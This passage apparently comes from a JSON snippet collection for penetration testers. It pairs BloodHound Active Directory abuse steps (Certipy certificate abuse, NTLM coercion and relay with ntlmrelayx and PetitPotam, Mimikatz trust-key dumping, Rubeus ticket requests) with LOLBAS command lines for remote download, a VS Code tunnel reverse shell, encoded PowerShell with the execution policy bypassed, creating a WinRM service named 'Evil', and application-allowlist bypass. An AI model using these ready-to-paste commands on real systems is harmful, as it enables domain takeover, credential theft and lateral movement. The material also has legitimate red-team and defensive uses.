            "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\nadd: servicePrincipalName\\nservicePrincipalName: SPN\" | ldapmodify -x -D \"ATTACKER-DN\" -w PWD -h DOMAIN-DNS-NAME",
            "```",
            "- Step 7: Perform Schannel authentication as targeted principal against affected DC using certificate.",
            "Open an LDAP shell as the victim using Certipy by specifying the certificate created in Step 5 and the IP of an affected DC:",
            "```sh",
            "certipy auth -pfx TARGET.pfx -dc-ip IP -ldap-shell",
            "```"
        ]
    },
    "ADCSESC13 linux abuse (bloodhound)": {
        "description": "The  controlled object has the privileges to perform the ADCS ESC13 abuse against the target AD group. The principal has enrollment rights on a certificate template configured with an issuance policy extension. The issuance policy has an OID group link to an AD group. The principal also has enrollment permission for an enterprise CA with the necessary template published. This enterprise CA is trusted for NT authentication and chains up to a root CA for the forest. This setup allows the principal to enroll a certificate that the principal can use to obtain access to the environment as a member of the group specified in the OID group link.",
        "prefix": "ADCSESC13",
        "body": [
            "The  $CONTROLLED has the privileges to perform the ADCS ESC13 abuse against the target AD group. The principal has enrollment rights on a certificate template configured with an issuance policy extension. The issuance policy has an OID group link to an AD group. The principal also has enrollment permission for an enterprise CA with the necessary template published. This enterprise CA is trusted for NT authentication and chains up to a root CA for the forest. This setup allows the principal to enroll a certificate that the principal can use to obtain access to the environment as a member of the group specified in the OID group link.",
            "To Abuse 'ADCSESC13' on linux: ",
            "An attacker may perform this attack in the following steps:",
            "- Step 1: Use Certipy to request enrollment in the affected template, specifying the affected enterprise CA:",
            "```sh",
            "certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC13",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "- Step 2: Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:",
            "```sh",
            "certipy auth -pfx john.pfx -dc-ip 172.16.126.128",
            "```"
        ]
    },
    "ManageCA linux abuse (bloodhound)": {
        "description": "The principal controlled object has the \"Manage CA\", also known as \"CA Administrator\", permission on the EnterpriseCA. This permission allows the principal to configure the CA to allow subject alternate names, publish certificate templates, grant \"Manage Certificates\" and more.",
        "prefix": "ManageCA",
        "body": [
            "The principal $CONTROLLED has the \"Manage CA\", also known as \"CA Administrator\", permission on the EnterpriseCA. This permission allows the principal to configure the CA to allow subject alternate names, publish certificate templates, grant \"Manage Certificates\" and more.",
            "To Abuse 'ManageCA' on linux: ",
            "This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "ManageCertificates linux abuse (bloodhound)": {
        "description": "The principal controlled object has the \"Manage Certificates\", also known as \"CA Officer\", permission on the Enterprise CA. This permission allows the principal to force the CA to issue certificates that the CA had previously denied issuance of.",
        "prefix": "ManageCertificates",
        "body": [
            "The principal $CONTROLLED has the \"Manage Certificates\", also known as \"CA Officer\", permission on the Enterprise CA. This permission allows the principal to force the CA to issue certificates that the CA had previously denied issuance of.",
            "To Abuse 'ManageCertificates' on linux: ",
            "This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "WritePKIEnrollmentFlag linux abuse (bloodhound)": {
        "description": "This entity has the ability to write to the msPKI-Enrollment-Flag attribute on the  target object, which allows the principal to configure \"manager approval\" for the certificate template and other settings.",
        "prefix": "WritePKIEnrollmentFlag",
        "body": [
            "This entity has the ability to write to the msPKI-Enrollment-Flag attribute on the  $TARGET, which allows the principal to configure \"manager approval\" for the certificate template and other settings.",
            "To Abuse 'WritePKIEnrollmentFlag' on linux: ",
            "This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "WritePKINameFlag linux abuse (bloodhound)": {
        "description": "This entity has the ability to write to the msPKI-Certificate-Name-Flag attribute on the  target object, which allows the principal to configure \"enrollee supplies subject\" for the certificate template among other settings.",
        "prefix": "WritePKINameFlag",
        "body": [
            "This entity has the ability to write to the msPKI-Certificate-Name-Flag attribute on the  $TARGET, which allows the principal to configure \"enrollee supplies subject\" for the certificate template among other settings.",
            "To Abuse 'WritePKINameFlag' on linux: ",
            "This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "DCFor linux abuse (bloodhound)": {
        "description": "This edge indicates that the computer is a domain controller for the domain. This edge is not created for read-only domain controllers.",
        "prefix": "DCFor",
        "body": [
            "This edge indicates that the computer is a domain controller for the domain. This edge is not created for read-only domain controllers.",
            "To Abuse 'DCFor' on linux: ",
            "Domain Controllers store all Active Directory credentials and configurations for all principals in the domain. If an adversary gains administrative access to a Domain Controller, there are several options at their disposal for compromising domain identities and domain-managed systems. Please see the references section for more information."
        ]
    },
    "OIDGroupLink linux abuse (bloodhound)": {
        "description": "The IssuancePolicy controlled object has an OID group link to the group target object. Certificate templates may include controlled object as an issuance policy extension. Users authenticating using a certificate of such a certificate template will be granted access as a member of the target object group.",
        "prefix": "OIDGroupLink",
        "body": [
            "The IssuancePolicy $CONTROLLED has an OID group link to the group $TARGET. Certificate templates may include $CONTROLLED as an issuance policy extension. Users authenticating using a certificate of such a certificate template will be granted access as a member of the $TARGET group.",
            "To Abuse 'OIDGroupLink' on linux: ",
            "An attacker may perform the ADCS ESC13 abuse which relies on the OID group link. This relationship alone is not enough to escalate rights or impersonate other principals."
        ]
    },
    "ExtendedByPolicy linux abuse (bloodhound)": {
        "description": "Certificates of the certificate template controlled object will include the issuance policy target object as a certificate extension.",
        "prefix": "ExtendedByPolicy",
        "body": [
            "Certificates of the certificate template $CONTROLLED will include the issuance policy $TARGET as a certificate extension.",
            "To Abuse 'ExtendedByPolicy' on linux: ",
            "An attacker may perform the ADCS ESC13 abuse which relies on an issuance policy included in a certificate. This relationship alone is not enough to escalate rights or impersonate other principals."
        ]
    },
    "SyncedToADUser linux abuse (bloodhound)": {
        "description": "The Entra user is synchronized to the on-prem AD user.The Entra user may be able to authenticate as the on-prem AD user with its own password if password write-back is enabled. The Entra user may already have the same password as the on-prem user if password hash synchronization is enabled.",
        "prefix": "SyncedToADUser",
        "body": [
            "The Entra user is synchronized to the on-prem AD user.The Entra user may be able to authenticate as the on-prem AD user with its own password if password write-back is enabled. The Entra user may already have the same password as the on-prem user if password hash synchronization is enabled.",
            "To Abuse 'SyncedToADUser' on linux: ",
            "An attacker may authenticate as the on-prem AD user using the Entra user\u2019s credentials, for example by key-logging the user\u2019s password, or by changing the Entra user\u2019s password and waiting for the password write-back operation to complete."
        ]
    },
    "SyncedToEntraUser linux abuse (bloodhound)": {
        "description": "The on-prem AD user is synchronized to the Entra ID user.The on-prem user may be able to authenticate as the Entra user with its own password if password hash synchronization, pass-through authentication, or seamless single sign-on is enabled.",
        "prefix": "SyncedToEntraUser",
        "body": [
            "The on-prem AD user is synchronized to the Entra ID user.The on-prem user may be able to authenticate as the Entra user with its own password if password hash synchronization, pass-through authentication, or seamless single sign-on is enabled.",
            "To Abuse 'SyncedToEntraUser' on linux: ",
            "An attacker may authenticate as the synchronized Entra user using the on-prem user\u2019s credentials, for example by dumping the user\u2019s plain-text credential from memory, key-logging the user\u2019s password, or by changing the on-prem user\u2019s password and authenticating with that new password."
        ]
    },
    "CoerceAndRelayNTLMToSMB linux abuse (bloodhound)": {
        "description": "This edge indicates that an attacker with \"Authenticated Users\" access can compromise the target computer by relaying the NTLM authentication of a victim computer with administrative rights on the target computer. The attack is possible because the attacker can trigger SMB-based coercion from the victim computer to their attacker-controlled host, and the target computer does not enforce SMB signing.Click on Relay Sources to view valid computers with administrative rights on the target computer that can be relayed. Click on Composition to view the full paths that lead to administrative rights on the target computer.",
        "prefix": "CoerceAndRelayNTLMToSMB",
        "body": [
            "This edge indicates that an attacker with \"Authenticated Users\" access can compromise the target computer by relaying the NTLM authentication of a victim computer with administrative rights on the target computer. The attack is possible because the attacker can trigger SMB-based coercion from the victim computer to their attacker-controlled host, and the target computer does not enforce SMB signing.Click on Relay Sources to view valid computers with administrative rights on the target computer that can be relayed. Click on Composition to view the full paths that lead to administrative rights on the target computer.",
            "To Abuse 'CoerceAndRelayNTLMToSMB' on linux: ",
            "1. Start the Relay Server The NTLM relay can be executed with [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py).",
            "2. Coerce the Target Computer Several coercion methods are documented here: [Windows Coerced Authentication Methods](https://github.com/p0dalirius/windows-coerced-authentication-methods). Examples of tools include:[printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)[PetitPotam](https://github.com/topotam/PetitPotam)"
        ]
    },
    "CoerceAndRelayNTLMToLDAP linux abuse (bloodhound)": {
        "description": "This edge indicates that the target computer has the WebClient service running. This enables an attacker with \"Authenticated Users\" access to trigger WebClient-based coercion from the target computer to their attacker-controlled host via NTLM. Since the connection originates from the WebClient instead of SMB, the attacker can relay the authentication attempt to the LDAP service of a domain controller that does not require LDAP signing. This relay can be used to abuse Active Directory permissions or obtain administrative access to the target computer using Resource-Based Constrained Delegation (RBCD) or Shadow Credentials.Click on Relay Targets to view the domain controllers in the domain that do not require LDAP signing.",
        "prefix": "CoerceAndRelayNTLMToLDAP",
        "body": [
            "This edge indicates that the target computer has the WebClient service running. This enables an attacker with \"Authenticated Users\" access to trigger WebClient-based coercion from the target computer to their attacker-controlled host via NTLM. Since the connection originates from the WebClient instead of SMB, the attacker can relay the authentication attempt to the LDAP service of a domain controller that does not require LDAP signing. This relay can be used to abuse Active Directory permissions or obtain administrative access to the target computer using Resource-Based Constrained Delegation (RBCD) or Shadow Credentials.Click on Relay Targets to view the domain controllers in the domain that do not require LDAP signing.",
            "To Abuse 'CoerceAndRelayNTLMToLDAP' on linux: ",
            "1. Start the Relay Server The NTLM relay can be executed with [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py). To relay to LDAP and perform a Shadow Credentials attack against the target computer:ntlmrelayx.py -t ldap://<Domain Controller IP> --shadow-credentials",
            "2. Coerce the Target Computer Several coercion methods are documented here: [Windows Coerced Authentication Methods](https://github.com/p0dalirius/windows-coerced-authentication-methods). Examples of tools include:[printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)[PetitPotam](https://github.com/topotam/PetitPotam)To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE.Petitpotam.py -d \"DOMAIN\" -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS@PORT/file.txt\" \"VICTIM_IP\""
        ]
    },
    "CoerceAndRelayNTLMToLDAPS linux abuse (bloodhound)": {
        "description": "This edge indicates that the target computer has the WebClient service running. This enables an attacker with \"Authenticated Users\" access to trigger WebClient-based coercion from the target computer to their attacker-controlled host via NTLM. Since the connection originates from the WebClient instead of SMB, the attacker can relay the authentication attempt to LDAPS of a domain controller that does not require LDAPS channel binding. This relay can be used to abuse Active Directory permissions or obtain administrative access to the target computer using Resource-Based Constrained Delegation (RBCD) or Shadow Credentials.Click on Relay Targets to view the domain controllers in the domain that do not require LDAPS channel binding.",
        "prefix": "CoerceAndRelayNTLMToLDAPS",
        "body": [
            "This edge indicates that the target computer has the WebClient service running. This enables an attacker with \"Authenticated Users\" access to trigger WebClient-based coercion from the target computer to their attacker-controlled host via NTLM. Since the connection originates from the WebClient instead of SMB, the attacker can relay the authentication attempt to LDAPS of a domain controller that does not require LDAPS channel binding. This relay can be used to abuse Active Directory permissions or obtain administrative access to the target computer using Resource-Based Constrained Delegation (RBCD) or Shadow Credentials.Click on Relay Targets to view the domain controllers in the domain that do not require LDAPS channel binding.",
            "To Abuse 'CoerceAndRelayNTLMToLDAPS' on linux: ",
            "1. Start the Relay Server The NTLM relay can be executed with [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py). To relay to LDAP and perform a Shadow Credentials attack against the target computer:ntlmrelayx.py -t ldaps://<Domain Controller IP> --shadow-credentials",
            "2. Coerce the Target Computer Several coercion methods are documented here: [Windows Coerced Authentication Methods](https://github.com/p0dalirius/windows-coerced-authentication-methods). Examples of tools include:[printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)[PetitPotam](https://github.com/topotam/PetitPotam)To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE.Petitpotam.py -d \"DOMAIN\" -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS@PORT/file.txt\" \"VICTIM_IP\""
        ]
    },
    "CoerceAndRelayNTLMToADCS linux abuse (bloodhound)": {
        "description": "This edge indicates that an attacker with \"Authenticated Users\" access can trigger SMB-based coercion from the target computer to their attacker-controlled host via NTLM. The authentication attempt from the target computer can then be relayed to an ESC8-vulnerable web enrollment endpoint of an Active Directory Certificate Services (ADCS) enterprise CA server. This allows the attacker to obtain a certificate enabling domain authentication as the target computer.Click on Relay Targets to view vulnerable enterprise CA servers that enable certificate enrollment for the target computer.",
        "prefix": "CoerceAndRelayNTLMToADCS",
        "body": [
            "This edge indicates that an attacker with \"Authenticated Users\" access can trigger SMB-based coercion from the target computer to their attacker-controlled host via NTLM. The authentication attempt from the target computer can then be relayed to an ESC8-vulnerable web enrollment endpoint of an Active Directory Certificate Services (ADCS) enterprise CA server. This allows the attacker to obtain a certificate enabling domain authentication as the target computer.Click on Relay Targets to view vulnerable enterprise CA servers that enable certificate enrollment for the target computer.",
            "To Abuse 'CoerceAndRelayNTLMToADCS' on linux: ",
            "1. Start the Relay Server The NTLM relay can be executed with [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py). To relay to the enterprise CA and enroll a certificate, specify the HTTP(S) endpoint as the target and use the arguments--adcs --template <TEMPLATE_NAME>.",
            "2. Coerce the Target Computer Several coercion methods are documented here: [Windows Coerced Authentication Methods](https://github.com/p0dalirius/windows-coerced-authentication-methods). Examples of tools include:[printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)[PetitPotam](https://github.com/topotam/PetitPotam)To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE."
        ]
    },
    "ClaimSpecialIdentity common abuse (bloodhound)": {
        "description": "The ClaimSpecialIdentity edge represents the ability to obtain an access token containing a special identity (group) SID. Unlike regular groups, membership in special identities is determined at authentication rather than by an explicit member list.See the Abuse section for specific cases.",
        "prefix": "ClaimSpecialIdentity",
        "body": [
            "The ClaimSpecialIdentity edge represents the ability to obtain an access token containing a special identity (group) SID. Unlike regular groups, membership in special identities is determined at authentication rather than by an explicit member list.See the Abuse section for specific cases.",
            "To Abuse 'ClaimSpecialIdentity' commonly: ",
            "Guest Account",
            "The Guest user account allows users without a personal account to log in. The account has no password by default.",
            "If enabled, anyone with AD access can log in with the Guest account.",
            "Network Identity",
            "Any user or computer accessing a Windows system via a network has the Network identity in their access token.",
            "Authentication Authority Asserted Identity",
            "Included in access tokens when an account is authenticated directly against a domain controller and not through Kerberos constrained delegation (service asserted identity).",
            "Key Trust",
            "Included in access tokens when authentication is based on public key credentials via key trust objects.",
            "Anyone with key trust credentials (e.g., from a Shadow Credentials attack) can obtain Key Trust identity access through PKINIT authentication.",
            "MFA Key Property",
            "Similar to Key Trust but requires the MFA property on the key trust credentials.",
            "A Shadow Credentials attack enables anyone to obtain the MFA Key Property identity access through PKINIT authentication.",
            "NTLM Authentication",
            "Included in an access token when authentication occurs via NTLM protocol.",
            "Any AD account can obtain NTLM authentication identity access, assuming NTLM is available.",
            "Schannel Authentication",
            "Included in an access token when authentication occurs via Schannel protocol.",
            "Any AD account can obtain the Schannel Authentication identity, for example by performing certificate authentication over Schannel.",
            "This Organization Identity",
            "Assigned to all accounts within the same Active Directory forest and trusted forests without selective authentication.",
            "This Organization Certificate Identity",
            "Assigned to all accounts within the same Active Directory forest and trusted forests without selective authentication, when the Kerberos PAC contains an NTLM_SUPPLEMENTAL_CREDENTIAL structure.",
            "Authentication using an ADCS certificate ensures the required PAC structure."
        ]
    },
    "HasTrustKeys common abuse (bloodhound)": {
        "description": "The domain controlled object has the trust keys of the trust account target object. The trust account exists because the source domain has an outbound trust to the domain of the trust account.The trust keys can be leveraged to authenticate as the trust account and gain access to the trust account's domain.",
        "prefix": "HasTrustKeys",
        "body": [
            "The domain $CONTROLLED has the trust keys of the trust account $TARGET. The trust account exists because the source domain has an outbound trust to the domain of the trust account.The trust keys can be leveraged to authenticate as the trust account and gain access to the trust account's domain.",
            "To Abuse 'HasTrustKeys' commonly: ",
            "Step 1: Obtain Trust Keys",
            "Trust keys can be dumped with administrative access to a domain controller of the source domain.",
            "On Windows, use Mimikatz to dump the trust keys:",
            "lsadump::trust /patch",
            "The trust keys for the target trust account appear under \"[ Out ]\" for the target domain.",
            "Step 2: Authenticate as the Trust Account",
            "The RC4 version of the trust keys serves as the RC4 Kerberos secret key for the trust account. This can be used directly to request a Kerberos Ticket-Granting Ticket (TGT).",
            "The AES trust keys are not identical to the AES Kerberos secret keys of the trust account due to different salt values. However, you can derive the AES Kerberos secret keys using the cleartext trust key and tools like krbrelayx.py. (See reference: [A Note on Calculating Kerberos Keys for AD Accounts](https://snovvcrash.rocks/2021/05/21/calculating-kerberos-keys.html) ).",
            "When authenticating as a trust account, there are two key limitations:Only Kerberos authentication is supported (NTLM authentication is not possible)Only network logins work (interactive logins such as RUNAS, console login, and RDP are not possible)",
            "On Windows, use Rubeus to obtain a TGT:",
            "Rubeus.exe asktgt /user:<trust account SAMAccountName> /domain:<target domain DNS name> /rc4:<RC4 trust key> /nowrap /ptt",
            "On Linux, use Impacket's getTGT.py to obtain a TGT:",
            "python getTGT.py <target domain DNS name>/<trust account SAMAccountName> -hashes : <RC4 trust key>"
        ]
    },
    "GfxDownloadWrapper.exe Download file from internet (lolbas)": {
        "prefix": "GfxDownloadWrapper.exe",
        "body": [
            "GfxDownloadWrapper.exe is Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination file path.. it can GfxDownloadWrapper.exe downloads the content that returns URL and writes it to the file DESTINATION FILE PATH. The binary is signed by \"Microsoft Windows Hardware\", \"Compatibility Publisher\", \"Microsoft Windows Third Party Component CA 2012\", \"Microsoft Time-Stamp PCA 2010\", \"Microsoft Time-Stamp Service\"., requires  privilege, category: Download, it can be used for Download file from internet.",
            "",
            "```sh",
            "C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe \"URL\" \"DESTINATION FILE\"${0}",
            "```"
        ],
        "description": "GfxDownloadWrapper.exe is Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination file path.. it can GfxDownloadWrapper.exe downloads the content that returns URL and writes it to the file DESTINATION FILE PATH. The binary is signed by \"Microsoft Windows Hardware\", \"Compatibility Publisher\", \"Microsoft Windows Third Party Component CA 2012\", \"Microsoft Time-Stamp PCA 2010\", \"Microsoft Time-Stamp Service\"., requires  privilege, category: Download, it can be used for Download file from internet."
    },
    "lolbas GfxDownloadWrapper.exe Download file from internet": {
        "prefix": "lolbas GfxDownloadWrapper.exe",
        "body": [
            "GfxDownloadWrapper.exe is Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination file path.. it can GfxDownloadWrapper.exe downloads the content that returns URL and writes it to the file DESTINATION FILE PATH. The binary is signed by \"Microsoft Windows Hardware\", \"Compatibility Publisher\", \"Microsoft Windows Third Party Component CA 2012\", \"Microsoft Time-Stamp PCA 2010\", \"Microsoft Time-Stamp Service\"., requires  privilege, category: Download, it can be used for Download file from internet.",
            "",
            "```sh",
            "C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe \"URL\" \"DESTINATION FILE\"${0}",
            "```"
        ],
        "description": "GfxDownloadWrapper.exe is Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination file path.. it can GfxDownloadWrapper.exe downloads the content that returns URL and writes it to the file DESTINATION FILE PATH. The binary is signed by \"Microsoft Windows Hardware\", \"Compatibility Publisher\", \"Microsoft Windows Third Party Component CA 2012\", \"Microsoft Time-Stamp PCA 2010\", \"Microsoft Time-Stamp Service\"., requires  privilege, category: Download, it can be used for Download file from internet."
    },
    "code.exe Reverse PowerShell session over MS provided infrastructure. (lolbas)": {
        "prefix": "code.exe",
        "body": [
            "code.exe is VSCode binary, also portable (CLI) version. it can Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets; command, requires  privilege, category: Execute, it can be used for Reverse PowerShell session over MS provided infrastructure..",
            "",
            "```sh",
            "code.exe tunnel --accept-server-license-terms --name \"tunnel-name\"${0}",
            "```"
        ],
        "description": "code.exe is VSCode binary, also portable (CLI) version. it can Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets; command, requires  privilege, category: Execute, it can be used for Reverse PowerShell session over MS provided infrastructure.."
    },
    "lolbas code.exe Reverse PowerShell session over MS provided infrastructure.": {
        "prefix": "lolbas code.exe",
        "body": [
            "code.exe is VSCode binary, also portable (CLI) version. it can Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets; command, requires  privilege, category: Execute, it can be used for Reverse PowerShell session over MS provided infrastructure..",
            "",
            "```sh",
            "code.exe tunnel --accept-server-license-terms --name \"tunnel-name\"${0}",
            "```"
        ],
        "description": "code.exe is VSCode binary, also portable (CLI) version. it can Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets; command, requires  privilege, category: Execute, it can be used for Reverse PowerShell session over MS provided infrastructure.."
    },
    "Powershell.exe Execute PowerShell cmdlets, .NET code, and just about anything else your heart desires (lolbas)": {
        "prefix": "Powershell.exe",
        "body": [
            "Powershell.exe is Powershell.exe is a a task-based command-line shell built on .NET.. it can Set the execution policy to bypass and execute a very malicious PowerShell encoded command, requires  privilege, category: Execute, it can be used for Execute PowerShell cmdlets, .NET code, and just about anything else your heart desires.",
            "",
            "```sh",
            "powershell.exe -ep bypass -ec IgBXAGUAIAA8ADMAIABMAE8ATABCAEEAUwAiAA==${0}",
            "```"
        ],
        "description": "Powershell.exe is Powershell.exe is a a task-based command-line shell built on .NET.. it can Set the execution policy to bypass and execute a very malicious PowerShell encoded command, requires  privilege, category: Execute, it can be used for Execute PowerShell cmdlets, .NET code, and just about anything else your heart desires."
    },
    "lolbas Powershell.exe Execute PowerShell cmdlets, .NET code, and just about anything else your heart desires": {
        "prefix": "lolbas Powershell.exe",
        "body": [
            "Powershell.exe is Powershell.exe is a a task-based command-line shell built on .NET.. it can Set the execution policy to bypass and execute a very malicious PowerShell encoded command, requires  privilege, category: Execute, it can be used for Execute PowerShell cmdlets, .NET code, and just about anything else your heart desires.",
            "",
            "```sh",
            "powershell.exe -ep bypass -ec IgBXAGUAIAA8ADMAIABMAE8ATABCAEEAUwAiAA==${0}",
            "```"
        ],
        "description": "Powershell.exe is Powershell.exe is a a task-based command-line shell built on .NET.. it can Set the execution policy to bypass and execute a very malicious PowerShell encoded command, requires  privilege, category: Execute, it can be used for Execute PowerShell cmdlets, .NET code, and just about anything else your heart desires."
    },
    "Launch-VsDevShell.ps1 Proxy execution (lolbas)": {
        "prefix": "Launch-VsDevShell.ps1",
        "body": [
            "Launch-VsDevShell.ps1 is Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell cmdlet. it can Execute binaries and commands from the context of the signed script using the \"VsInstallationPath\" flag., requires  privilege, category: Execute, it can be used for Proxy execution.",
            "",
            "```sh",
            "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsInstallationPath \"/../../../../../; {PATH:.exe} ;\"${0}",
            "```"
        ],
        "description": "Launch-VsDevShell.ps1 is Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell cmdlet. it can Execute binaries and commands from the context of the signed script using the \"VsInstallationPath\" flag., requires  privilege, category: Execute, it can be used for Proxy execution."
    },
    "lolbas Launch-VsDevShell.ps1 Proxy execution": {
        "prefix": "lolbas Launch-VsDevShell.ps1",
        "body": [
            "Launch-VsDevShell.ps1 is Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell cmdlet. it can Execute binaries and commands from the context of the signed script using the \"VsInstallationPath\" flag., requires  privilege, category: Execute, it can be used for Proxy execution.",
            "",
            "```sh",
            "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsInstallationPath \"/../../../../../; {PATH:.exe} ;\"${0}",
            "```"
        ],
        "description": "Launch-VsDevShell.ps1 is Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell cmdlet. it can Execute binaries and commands from the context of the signed script using the \"VsInstallationPath\" flag., requires  privilege, category: Execute, it can be used for Proxy execution."
    },
    "CL_Invocation.ps1 Proxy execution (lolbas)": {
        "prefix": "CL_Invocation.ps1",
        "body": [
            "CL_Invocation.ps1 is Aero diagnostics script. it can Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable., requires  privilege, category: Execute, it can be used for Proxy execution.",
            "",
            "```sh",
            ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1   \\nSyncInvoke {CMD}${0}",
            "```"
        ],
        "description": "CL_Invocation.ps1 is Aero diagnostics script. it can Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable., requires  privilege, category: Execute, it can be used for Proxy execution."
    },
    "lolbas CL_Invocation.ps1 Proxy execution": {
        "prefix": "lolbas CL_Invocation.ps1",
        "body": [
            "CL_Invocation.ps1 is Aero diagnostics script. it can Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable., requires  privilege, category: Execute, it can be used for Proxy execution.",
            "",
            "```sh",
            ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1   \\nSyncInvoke {CMD}${0}",
            "```"
        ],
        "description": "CL_Invocation.ps1 is Aero diagnostics script. it can Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable., requires  privilege, category: Execute, it can be used for Proxy execution."
    },
    "winrm.vbs Proxy execution (lolbas)": {
        "prefix": "winrm.vbs",
        "body": [
            "winrm.vbs is Script used for manage Windows RM settings. it can Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol, requires  privilege, category: Execute, it can be used for Proxy execution.",
            "",
            "```sh",
            "winrm invoke Create wmicimv2/Win32_Service @{Name=\"Evil\";DisplayName=\"Evil\";PathName=\"{CMD}\"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985${0}",
            "```"
        ],
        "description": "winrm.vbs is Script used for manage Windows RM settings. it can Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol, requires  privilege, category: Execute, it can be used for Proxy execution."
    },
    "lolbas winrm.vbs Proxy execution": {
        "prefix": "lolbas winrm.vbs",
        "body": [
            "winrm.vbs is Script used for manage Windows RM settings. it can Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol, requires  privilege, category: Execute, it can be used for Proxy execution.",
            "",
            "```sh",
            "winrm invoke Create wmicimv2/Win32_Service @{Name=\"Evil\";DisplayName=\"Evil\";PathName=\"{CMD}\"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985${0}",
            "```"
        ],
        "description": "winrm.vbs is Script used for manage Windows RM settings. it can Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol, requires  privilege, category: Execute, it can be used for Proxy execution."
    },
    "winrm.vbs Execute arbitrary, unsigned code via XSL script (lolbas)": {
        "prefix": "winrm.vbs",
        "body": [
            "winrm.vbs is Script used for manage Windows RM settings. it can Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe., requires  privilege, category: AWL Bypass, it can be used for Execute arbitrary, unsigned code via XSL script.",
            "",
            "```sh",
            "%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty${0}",
            "```"
        ],
        "description": "winrm.vbs is Script used for manage Windows RM settings. it can Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe., requires  privilege, category: AWL Bypass, it can be used for Execute arbitrary, unsigned code via XSL script."
    },
    "lolbas winrm.vbs Execute arbitrary, unsigned code via XSL script": {
        "prefix": "lolbas winrm.vbs",
        "body": [
            "winrm.vbs is Script used for manage Windows RM settings. it can Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe., requires  privilege, category: AWL Bypass, it can be used for Execute arbitrary, unsigned code via XSL script.",
            "",
            "```sh",
            "%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty${0}",
            "```"
        ],
